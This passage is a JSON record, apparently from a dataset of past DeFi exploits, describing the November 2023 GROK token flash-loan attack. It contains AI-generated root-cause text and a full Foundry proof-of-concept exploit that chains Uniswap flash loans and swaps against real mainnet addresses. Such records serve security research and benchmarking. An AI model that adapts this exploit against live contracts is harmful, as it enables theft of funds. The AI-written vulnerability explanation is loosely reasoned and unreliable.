r repays the flash loan from the `pair` contract with WETH. || 10. The attacker transfers the remaining GROK tokens to the `pair` contract. || 11. The attacker repays the initial WETH flash loan to `wethpair` with interest.", "ai_confidence_has_source_code": true, "ai_confidence_known_pattern_match": true, "ai_confidence_reasoning": "1 verified, 0 proxy", "ai_confidence_score": 0.75, "ai_confidence_verified_contracts": true, "ai_explanation": "The attacker exploited the GROK token by leveraging flash loans from Uniswap V3 and V2. The attack involved borrowing a large amount of WETH via a flash loan from the WETH/USDC pool (wethpair). This WETH was then used to swap for GROK tokens on Uniswap V2. Subsequently, another flash loan was taken from the GROK/WETH pool (pair) to acquire more GROK. The attacker then swapped the acquired GROK tokens back to WETH using Uniswap V3, profiting from the price manipulation. Finally, the borrowed WETH was repaid with a small amount of interest. The core vulnerability lies in the `_transfer` function of the GROK token, specifically the lack of reentrancy guards and insufficient checks on the `_maxTxAmount` and `_maxWalletSize` when interacting with external DEXs, allowing for rapid price manipulation through flash loans. The `swapTokensForEth` function, called when the contract balance exceeds `_taxSwapThreshold`, also contributes by enabling the token to be swapped for ETH, further facilitating the manipulation.", "ai_mitigation": [], "ai_root_cause": "The vulnerability stems from the GROK token's `_transfer` function, which lacks adequate reentrancy guards and robust checks against price manipulation. Specifically, the contract allows for large token transfers and swaps through external DEXs (Uniswap V2 and V3) without sufficient safeguards to prevent an attacker from exploiting price differences created by flash loans. The `swapTokensForEth` function, which is triggered when the contract's token balance exceeds a threshold, further enables the attacker to convert tokens to ETH, exacerbating the price impact.", "ai_vulnerability_type": "Flash Loan Attack", "attack_title": "Tx : https://explorer.phalcon.xyz/tx/eth/0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813?line=136", "contracts": [{"abi_available": true, "address": "0x8390a1da07e376ef7add4be859ba74fb83aa02d5", "artifact_dir": "data/contracts/2023_11_grok/contracts/01_vulnerable_8390a1da_grok", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.8.20+commit.a1b79de6", "contract_name": "GROK", "explorer_url": "https://etherscan.io/address/0x8390a1da07e376ef7add4be859ba74fb83aa02d5", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:26:43.520Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2023_11_grok/contracts/01_vulnerable_8390a1da_grok/source.sol"], "source_hint": "AI extracted: The vulnerability lies in the `grok` token contract, which appears to be susceptible to a flash loan attack. The attack contract leverages flash loans from Uniswap V3 (`wethpair`) and Uniswap V2 (`pair`) to manipulate token prices and drain funds from the `grok` token.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2023_11_grok", "id": "2023_11_grok", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:26:48.314Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~26 ETH
// Attacker : https://etherscan.io/address/0x864e656c57a5a119f332c47326a35422294db5c9
// Attack Contract : https://etherscan.io/address/0x03e7b13bcd9b8383f403696c1494845560607eca
// Vuln Contract : https://etherscan.io/address/0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813?line=136

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1722841076120130020

contract ContractTest is Test {
    Uni_Router_V2 router_v2 = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Router_V3 router_v3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 grok = IERC20(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V3 wethpair = Uni_Pair_V3(0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa);
    Uni_Pair_V3 pair = Uni_Pair_V3(0x66bA59cBD09E75B209D1D7E8Cf97f4Ab34DA413B);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_538_679 - 1);
        cheats.label(address(weth), "WETH");
    }

    function testExpolit() public {
        emit log_named_decimal_uint("attaker balance before attack:", weth.balanceOf(address(this)), weth.decimals());
        wethpair.flash(address(this), 0, 30_000_000_000_000_000_000, new bytes(1));
        emit log_named_decimal_uint("attaker balance after attack:", weth.balanceOf(address(this)), weth.decimals());
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == address(wethpair)) {
            pair.flash(address(this), 63_433_590_767_572_373, 0, new bytes(1));
            grok.approve(address(router_v3), grok.balanceOf(address(this)));
            router_v3.exactInputSingle(
                Uni_Router_V3.ExactInputSingleParams({
                    tokenIn: address(grok),
                    tokenOut: address(weth),
                    fee: 10_000,
                    recipient: address(this),
                    deadline: block.timestamp + 100,
                    amountIn: grok.balanceOf(address(this)),
                    amountOutMinimum: 30 ether,
                    sqrtPriceLimitX96: 0
                })
            );
            weth.transfer(address(wethpair), 30 ether + uint256(amount1));
        } else {
            weth.approve(address(router_v2), type(uint256).max);
            grok.approve(address(router_v2), type(uint256).max);
            grok.approve(address(router_v3), type(uint256).max);
            //first step
            address[] memory path = new address[](2);
            path[0] = address(grok);
            path[1] = address(weth);
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                30_695_631_768_482_954, 0, path, address(this), block.timestamp + 100
            );
            grok.transfer(address(grok), 2_737_958_999_089_419);
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                30_000_000_000_000_000, 0, path, address(this), block.timestamp + 100
            );
            path[0] = address(weth);
            path[1] = address(grok);
            router_v2.swapTokensForExactTokens(
                64_067_926_675_248_097, weth.balanceOf(address(this)), path, address(this), block.timestamp + 100
            );
            grok.transfer(address(pair), grok.balanceOf(address(this)));
            //second step
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                30_000_000_000_000_000_000, 0, path, address(this), block.timestamp + 100
            );
        }
    }
}
